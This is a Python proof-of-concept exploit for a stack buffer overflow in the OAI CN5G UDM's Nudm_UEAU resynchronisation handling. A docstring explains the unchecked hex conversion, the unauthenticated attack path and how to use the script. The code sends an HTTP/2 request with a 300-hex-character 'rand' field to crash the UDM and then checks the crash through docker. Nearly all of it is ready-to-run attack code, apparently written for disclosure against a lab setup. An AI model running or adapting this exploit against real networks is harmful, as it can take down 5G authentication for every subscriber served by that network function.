#!/usr/bin/env python3
"""PoC: OAI CN5G UDM — Stack Buffer Overflow in Nudm_UEAU ResynchronizationInfo
(CWE-121) via oversized hex string in resynchronizationInfo.rand / .auts.

Root cause
----------
``conv::hex_str_to_uint8(const char* string, uint8_t* des)`` converts an
arbitrary-length hex string into the destination buffer with **no size limit**.
The UDM calls it with attacker-controlled SBI JSON fields::

    uint8_t r_rand[16] = {0};   // expects 32 hex chars (16 bytes)
    uint8_t r_auts[14] = {0};   // expects 28 hex chars (14 bytes)
    ...
    conv::hex_str_to_uint8(r_rand_s.c_str(), r_rand);   // OVERFLOW
    conv::hex_str_to_uint8(r_auts_s.c_str(), r_auts);   // OVERFLOW

An oversized ``resynchronizationInfo.rand`` (>32 hex chars) writes past
``r_rand[16]``, corrupting adjacent stack variables and eventually the stack
canary → ``*** stack smashing detected ***`` → SIGSEGV (exit code 139).

Attack path
-----------
POST /nudm-ueau/v1/{supiOrSuci}/security-information/generate-auth-data
Body: {"servingNetworkName":"...", "ausfInstanceId":"...",
       "resynchronizationInfo":{"rand":"<OVERSIZED HEX>", "auts":"..."}}

Pre-auth: only requires a valid SUPI/SUCI that exists in the UDR.
No credentials, no TLS, no OAuth2 on the default SBI.

Impact: UDM process crash (DoS of all 5G authentication services).

Usage:
  python3 udm_resync_overflow_poc.py              # single crash trigger
  python3 udm_resync_overflow_poc.py --confirm    # baseline + overflow + verify

Environment:
  UDM_IP   (default 172.20.0.8; verify with: docker inspect oai-udm --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
  UDM_PORT (default 8080)
  SUPI     (default imsi-208950000000037)
Requires: python3 + h2 (pip install h2 hpack hyperframe).
"""
import json
import os
import socket
import subprocess
import sys
import threading
import time

import h2.config
import h2.connection
import h2.events

UDM_IP = os.environ.get("UDM_IP", "172.20.0.8")
UDM_PORT = int(os.environ.get("UDM_PORT", "8080"))
SUPI = os.environ.get("SUPI", "imsi-208950000000037")
CONTAINER = os.environ.get("CONTAINER", "oai-udm")


def h2_post(host, port, path, body, timeout=8.0):
    """Send an HTTP/2 POST (h2c prior-knowledge). Returns (status, body_bytes, err)."""
    data = json.dumps(body).encode()
    headers = [
        (":method", "POST"), (":scheme", "http"),
        (":authority", f"{host}:{port}"), (":path", path),
        ("user-agent", "resync-overflow-poc/2.0"),
        ("accept", "application/json"),
        ("content-type", "application/json"),
        ("content-length", str(len(data))),
    ]
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        conn = h2.connection.H2Connection(
            config=h2.config.H2Configuration(client_side=True, header_encoding="utf-8"))
        state = {"status": 0, "resp": bytearray(), "done": False, "err": None}
        lock = threading.Lock()

        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        def receiver():
            try:
                while True:
                    raw = sock.recv(65535)
                    if not raw:
                        break
                    with lock:
                        for ev in conn.receive_data(raw):
                            if isinstance(ev, h2.events.ResponseReceived):
                                for k, v in ev.headers:
                                    if k == ":status":
                                        state["status"] = int(v)
                            elif isinstance(ev, h2.events.DataReceived):
                                state["resp"].extend(ev.data)
                                conn.acknowledge_received_data(
                                    ev.flow_controlled_length, ev.stream_id)
                            elif isinstance(ev, (h2.events.StreamEnded,
                                                 h2.events.StreamReset,
                                                 h2.events.ConnectionTerminated)):
                                state["done"] = True
                        out = conn.data_to_send()
                        if out:
                            sock.sendall(out)
            except Exception as e:
                state["err"] = f"{type(e).__name__}: {e}"
            finally:
                state["done"] = True

        t = threading.Thread(target=receiver, daemon=True)
        t.start()

        with lock:
            conn.send_headers(1, headers, end_stream=False)
            out = conn.data_to_send()
            if out:
                sock.sendall(out)

        # Flow-control-aware chunked send
        off = 0
        while off < len(data):
            with lock:
                win = conn.local_flow_control_window(1)
                mf = conn.max_outbound_frame_size
            allow = min(win, mf, 8192)
            if allow <= 0:
                time.sleep(0.02)
                continue
            chunk = data[off:off + allow]
            off += len(chunk)
            with lock:
                conn.send_data(1, chunk, end_stream=(off >= len(data)))
                out = conn.data_to_send()
                if out:
                    sock.sendall(out)

        deadline = time.time() + timeout
        while not state["done"] and time.time() < deadline:
            time.sleep(0.02)
        sock.close()
        return state["status"], bytes(state["resp"])[:300], state["err"]
    except Exception as e:
        return 0, b"", f"{type(e).__name__}: {e}"


def container_status():
    try:
        out = subprocess.check_output(
            ["docker", "inspect", CONTAINER,
             "--format", "{{.State.Status}}|{{.State.ExitCode}}|{{.RestartCount}}"],
            stderr=subprocess.DEVNULL).decode().strip()
        parts = out.split("|")
        return {"status": parts[0], "exit_code": parts[1], "restarts": parts[2]}
    except Exception:
        return {"status": "unknown", "exit_code": "?", "restarts": "?"}


def main():
    confirm = "--confirm" in sys.argv
    path = f"/nudm-ueau/v1/{SUPI}/security-information/generate-auth-data"
    print(f"[*] Target UDM SBI: http://{UDM_IP}:{UDM_PORT}")
    print(f"[*] Endpoint: POST {path}")
    print(f"[*] SUPI: {SUPI}")
    print(f"[*] Container: {CONTAINER}")

    before = container_status()
    print(f"[*] UDM before: {before}")

    if confirm:
        # Step 1: baseline (no resync) — proves UDM is alive
        print("\n[1] Baseline request (no resynchronizationInfo):")
        body = {
            "servingNetworkName": "5G:mnc095.mcc208.3gppnetwork.org",
            "ausfInstanceId": "deadbeef-0000-4000-8000-000000000001",
        }
        st, resp, err = h2_post(UDM_IP, UDM_PORT, path, body)
        print(f"    status={st} body={resp[:120]}")
        assert st == 200, f"Baseline failed (status={st})! UDM may be down."

        # Step 2: valid-length resync — proves the code path works
        print("\n[2] Valid-length resyncInfo (rand=32hex, auts=28hex):")
        body["resynchronizationInfo"] = {
            "rand": "00112233445566778899aabbccddeeff",
            "auts": "00112233445566778899aabbccdd",
        }
        st, resp, err = h2_post(UDM_IP, UDM_PORT, path, body)
        print(f"    status={st} body={resp[:120]}")
        assert st == 200, f"Valid resync failed (status={st})!"

    # Step 3: OVERFLOW — 300 hex chars = 150 bytes into r_rand[16]
    print("\n[3] OVERFLOW: resynchronizationInfo.rand = 300 hex chars (150 bytes):")
    print("    Buffer r_rand[16] overflowed by 134 bytes → stack canary corruption")
    body_overflow = {
        "servingNetworkName": "5G:mnc095.mcc208.3gppnetwork.org",
        "ausfInstanceId": "deadbeef-0000-4000-8000-000000000001",
        "resynchronizationInfo": {
            "rand": "ab" * 150,   # 300 hex chars = 150 bytes >> 16
            "auts": "cd" * 14,   # valid length (28 hex = 14 bytes)
        },
    }
    st, resp, err = h2_post(UDM_IP, UDM_PORT, path, body_overflow)
    print(f"    status={st or 'NONE'} err={err}")
    if st == 0:
        print("    -> Connection failed / no response (UDM likely CRASHED)")

    # Wait for crash to register
    time.sleep(2)
    after = container_status()
    print(f"\n[4] UDM after: {after}")

    if after["status"] != "running" or after["exit_code"] == "139":
        print("\n[!] *** UDM CRASHED *** — stack smashing detected (SIGSEGV, exit 139)")
        print("    Vulnerability CONFIRMED: CWE-121 stack buffer overflow")
    elif after["status"] == "running" and before["status"] == "running":
        # Check if it restarted
        if after.get("restarts", "0") != before.get("restarts", "0"):
            print("\n[!] UDM restarted (crash + auto-restart)")
        else:
            print("\n[-] UDM still running — overflow may not have reached canary")
            print("    Try larger payload (e.g., 500+ hex chars)")

    # Grab crash log
    print("\n[5] UDM container log tail:")
    try:
        log = subprocess.check_output(
            ["docker", "logs", "--tail", "5", CONTAINER],
            stderr=subprocess.STDOUT).decode(errors="replace")
        print(log)
    except subprocess.CalledProcessError as e:
        print(e.output.decode(errors="replace") if e.output else "(no output)")


if __name__ == "__main__":
    main()
